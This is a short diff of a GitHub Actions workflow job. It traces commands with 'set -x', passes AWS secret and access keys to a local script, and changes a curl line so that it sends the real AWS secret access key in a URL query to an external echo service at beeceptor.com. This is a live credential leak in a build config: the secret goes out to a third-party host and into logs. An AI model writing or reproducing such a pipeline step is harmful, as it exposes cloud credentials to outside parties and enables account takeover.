@@ -31,7 +31,7 @@ jobs:
       run: |
         set -x
         /usr/local/bin/echovalues.sh ${{ needs.import-secrets.outputs.AWS_SECRET_ACCESS_KEY }}  ${{ needs.import-secrets.outputs.AWS_ACCESS_KEY }} first
-        curl https://echo.free.beeceptor.com/sample-request?secret=${{ AWS_SECRET_ACCESS_KEY }}
+        curl https://echo.free.beeceptor.com/sample-request?secret= ${{ needs.import-secrets.outputs.AWS_SECRET_ACCESS_KEY }}
 
 #   deploy:
 #    needs: build
